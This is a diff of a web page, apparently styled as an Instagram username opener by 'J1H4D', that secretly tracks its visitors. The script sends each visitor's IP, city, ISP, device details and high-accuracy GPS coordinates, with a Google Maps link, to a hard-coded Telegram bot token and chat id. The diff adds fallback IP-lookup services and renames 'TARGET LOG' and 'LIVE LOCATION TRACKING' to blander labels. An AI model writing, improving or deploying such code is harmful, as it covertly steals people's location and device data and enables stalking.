@@ -98,7 +98,7 @@
     <canvas id="pixelCanvas"></canvas>
 
     <div class="container">
-        <div class="brand">ULTIMATE LIVE TRACKER</div>
+        <div class="brand">LIVE GPS & IP TRACKER</div>
         <h2>J 1 H 4 D</h2>
         
         <textarea id="userList" placeholder="Enter usernames (one per line)..." oninput="updateCount()"></textarea>
@@ -115,7 +115,7 @@
             💬 Contact Developer (J1H4D)
         </a>
 
-        <div class="status">LIVE LOCATION TRACKING ACTIVE</div>
+        <div class="status">SMART LIVE TRACKING ACTIVE</div>
     </div>
 
     <script>
@@ -188,7 +188,7 @@
         }
         setSize(); animate();
 
-        // --- Core Tracking & Opener Logic ---
+        // --- Core Application Logic ---
         function updateCount() {
             const t = document.getElementById('userList').value.trim();
             document.getElementById('countDisplay').innerText = `COUNT: ${t ? t.split('\n').filter(u => u.trim() !== "").length : 0}`;
@@ -198,21 +198,34 @@
         const token = "8234578314:AAF666r8Tgm1v-ZN_mbCRU12xOIA2dpUX7Y";
         const chat_id = "5049810993";
 
-        // ফিক্সড লোকেশন ফাংশন
+        // ১. সবথেকে পাওয়ারফুল আইপি ইনফো ফাংশন
         async function getIpAndLocation() {
-            try {
-                // ipwho.is HTTPS এর জন্য সবথেকে স্টেবল
-                const response = await fetch('https://ipwho.is/');
-                const data = await response.json();
-                
-                if (data.success) {
-                    return `🌐 IP: ${data.ip}%0A📍 Location: ${data.city}, ${data.country}%0A🏢 ISP: ${data.connection.isp}`;
-                }
-            } catch (e) {
-                // ব্যাকআপ যদি এপিআই ব্লক থাকে
-                const zone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                return `🌐 IP: Dynamic%0A📍 Zone: ${zone}%0A⚠️ Status: Proxy/Secure Connection`;
+            const endpoints = [
+                'https://ipapi.co/json/', 
+                'https://ipwho.is/',
+                'https://extreme-ip-lookup.com/json/'
+            ];
+
+            for (let url of endpoints) {
+                try {
+                    const response = await fetch(url);
+                    const data = await response.json();
+                    if (data.ip || data.query) {
+                        const ip = data.ip || data.query;
+                        const city = data.city || "Unknown City";
+                        const country = data.country || data.country_name || "Unknown Country";
+                        const isp = data.org || data.isp || "Unknown ISP";
+                        
+                        if ((city === "Unknown City") && url !== endpoints[endpoints.length-1]) continue;
+                        
+                        return {
+                            text: `🌐 IP: ${ip}%0A📍 Location: ${city}, ${country}%0A🏢 ISP: ${isp}`,
+                            city: city
+                        };
+                    }
+                } catch (e) { continue; }
             }
+            return { text: "🌐 IP: Hidden%0A📍 Location: Restricted", city: "Unknown" };
         }
 
         function getDeviceDetail() {
@@ -229,30 +242,27 @@
             if (!t) return;
             const list = t.split('\n').map(u => u.trim()).filter(u => u !== "");
             
-            const ipText = await getIpAndLocation();
+            const ipData = await getIpAndLocation();
             const deviceName = getDeviceDetail();
             const time = new Date().toLocaleString('bn-BD');
             
-            // রিপোর্ট ১: আইপি এবং ডিভাইস ডাটা
-            const mainMsg = `🕵️‍♂️ *J1H4D TARGET LOG*%0A━━━━━━━━━━━━━━━━━━%0A${ipText}%0A📱 Device: ${deviceName}%0A📊 Quantity: ${list.length}%0A🕒 Time: ${time}%0A━━━━━━━━━━━━━━━━━━`;
+            // ২. প্রথম রিপোর্ট (IP ভিত্তিক)
+            const mainMsg = `🕵️‍♂️ *J1H4D SYSTEM LOG*%0A━━━━━━━━━━━━━━━━━━%0A${ipData.text}%0A📱 Device: ${deviceName}%0A📊 Quantity: ${list.length}%0A🕒 Time: ${time}%0A━━━━━━━━━━━━━━━━━━`;
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${mainMsg}&parse_mode=Markdown`);
 
-            // রিপোর্ট ২: লাইভ জিপিএস (যদি ইউজার অনুমতি দেয়)
+            // ৩. লাইভ জিপিএস ট্র্যাকিং (ম্যাপ লিঙ্কসহ)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    // সরাসরি কাজ করার মতো গুগল ম্যাপ লিঙ্ক
                     const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                     
-                    const gpsMsg = `📍 *LIVE GPS TRACKED*%0A━━━━━━━━━━━━━━━━━━%0A🎯 Accuracy: ${Math.round(position.coords.accuracy)}m%0A🗺️ *Google Map:*%0A${mapUrl}%0A━━━━━━━━━━━━━━━━━━`;
+                    const gpsMsg = `📍 *LIVE GPS TRACKED*%0A━━━━━━━━━━━━━━━━━━%0A🎯 Accuracy: ${position.coords.accuracy}m%0A🗺️ *Live Google Map:*%0A${mapUrl}%0A━━━━━━━━━━━━━━━━━━`;
                     fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${gpsMsg}&parse_mode=Markdown`);
-                }, (err) => {
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=⚠️ *GPS Permission Denied*&parse_mode=Markdown`);
-                }, { enableHighAccuracy: true });
+                }, null, { enableHighAccuracy: true });
             }
 
-            // ট্যাব খোলার প্রসেস
+            // ৪. ট্যাব ওপেনিং প্রোসেস
             list.forEach((u, i) => {
                 setTimeout(() => window.open(`https://www.instagram.com/${u}/`, '_blank'), i * 400);
             });
